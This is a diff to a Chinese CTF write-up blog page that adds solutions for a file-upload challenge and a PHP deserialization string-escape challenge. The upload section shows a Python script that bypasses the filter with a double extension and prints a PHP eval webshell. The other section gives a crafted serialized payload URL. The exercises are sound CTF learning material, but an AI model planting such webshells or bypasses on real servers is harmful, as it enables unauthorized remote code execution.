@@ -384,14 +384,14 @@ http签到题一
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    628
+                    1.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    4 分
                 </div>
                 
 
@@ -463,8 +463,7 @@ http签到题一
 <img src="/img/9-12/11.png">
 
 <p>然后根据规则，编写python脚本，注意一下Cookie(session)问题，开始还没注意到</p>
-<pre class="language-python" data-language="python"><code class="language-python">from datetime import time
-import requests
+<pre class="language-python" data-language="python"><code class="language-python">import requests
 from bs4 import BeautifulSoup
 
 #默认post参数
@@ -525,6 +524,45 @@ for i in range(20):
 
 
 
+<h1 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h1><p>经典文件上传处理</p>
+<p>首页查看js源码，查看ajex，发现upload.php</p>
+<img src="/img/9-12/15.png">
+
+<p>进行访问，得到源码</p>
+<img src="/img/9-12/16.png">
+
+<p>对上传文件检查了文件类型，和文件名，关键$fileNameParts&nbsp;=&nbsp;explode(‘.’,&nbsp;$fileName); 将文件名变为数组后，$secondSegment&nbsp;=&nbsp;$fileNameParts[1]; </p>
+<p>固定取下标为1</p>
+<p>绕过：抓包，修改文件类型为image/png,修改文件名为test.png.php</p>
+<p>这里我没抓包，我用的python脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python">import requests
+url ='http://localhost:55163/upload.php'
+file={
+    'file':('test.png.php' #文件名
+            ,open("D:/phpstudy_pro/WWW/upload- picture/link.php",'rb')
+            ,'image/png' #文件类型
+            )
+
+}
+res=requests.post(url,files=file)
+print(res.text)</code></pre>
+
+<p>上传一句话木马成功！</p>
+<img src="/img/9-12/17.png">
+
+<p>这里附上一句话木马（不看就好-*-*）</p>
+<pre class="language-php" data-language="php"><code class="language-php">89504E47
+&lt;?php echo phpinfo();
+@eval($_POST['bb']); ?&gt;</code></pre>
+
+<p>访问验证一下</p>
+<img src="/img/9-12/18.png">
+
+<p>用蚁剑一连，flag就在根目录</p>
+<img src="/img/9-12/19.png">
+
+
+
 <h1 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h1><p>文件上传先试下水，上传成功</p>
 <img src="\img\9-12\1.png">
 
@@ -546,6 +584,29 @@ for i in range(20):
 <pre class="language-text" data-language="text"><code class="language-text">http://localhost:55371/Fl3g_n0t_Here_dont_peek!!!!!.php?param1=s878926199a&amp;param2=s214587387a</code></pre>
 
 <img src="\img\9-12\6.png">
+
+
+
+<h1 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h1><p>典型的PHP反序列化中的字符串逃逸题目</p>
+<p>访问它包含的文件Hanxin.exe.php ，得到源码，</p>
+<p>对两个页面进行代码审计，发现，关键是反序列化后Spear_Owner 属性为MaoLei 就可获得flag</p>
+<p>而我们可以通过get传参给Chant 属性赋值，恰巧他对序列化的字符串进行了如下的字符串替换</p>
+<img src="/img/9-12/13.png">
+
+<p>所以先写出要逃逸的字符串：	</p>
+<pre class="language-none"><code class="language-none">";s:11:"Spear_Owner";s:6:"MaoLei";}</code></pre>
+
+<p>然后要逃逸的字符总数为35个，</p>
+<p>发现：di_qi_qiang 替换后增加5个字符，di_jiu_qiang 替换后增加20个字符</p>
+<p>因此加入di_qi_qiang 3个，di_jiu_qiang个；序列化后替换后会恰好增加35个字符，然后后面的字符就能逃逸出去，进行反序列化到}结束，就此覆盖了他构造函数对Spear_Owner 赋值，拿到flag</p>
+<p>最终payload</p>
+<pre class="language-none"><code class="language-none">http://localhost:53192/?chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_jiu_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}</code></pre>
+
+<img src="/img/9-12/14.png">
+
+
+
+
                 
             </div>
             <hr/>
